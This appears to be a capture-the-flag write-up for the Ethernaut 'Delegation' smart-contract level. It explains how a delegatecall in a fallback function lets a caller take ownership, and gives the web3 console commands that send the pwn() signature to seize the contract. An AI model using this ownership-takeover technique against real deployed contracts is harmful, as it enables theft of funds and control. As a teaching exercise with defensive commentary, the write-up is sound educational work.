# Delegation

## Problem

Claim claim ownership of provided instance of Delegation contract.

## Solution proposal

This is a good example to understand how delegatecall works, which is being used in fallback method of *Delegation* contract.

We just have to send function signature of `pwn` method from *Delegate* contract as `msg.data` to the fallback function of *Delegation* contract, that code of *Delegate* contract is actually executed in the context of *Delegation*, so, when `pwn` method is executed

```solidity
  function pwn() public {
    owner = msg.sender;
  }
```

Instead of update the `owner` property for *Delegate* contract, you will update the `owner` property of *Delegation* contract.

## Solution

So, first get encoded function signature of pwn, in console:

```js
signature = web3.eth.abi.encodeFunctionSignature("pwn()")
```

Then we send a transaction with signature as data, so that fallback gets called:

```js
await contract.sendTransaction({ from: player, data: signature })
```

After transaction is successfully mined player is the owner of Delegation.

## Usefull Links

[web3js sendTransaction](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#sendtransaction)
[solidity abi spec](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html)
[Understanding delegatecall](https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how)
[delegatecall solidity-by-example](https://solidity-by-example.org/delegatecall/)

## Additional information

Usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The `delegatecall` function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) article for an accurate explanation of how this idea was used to steal 30M USD.
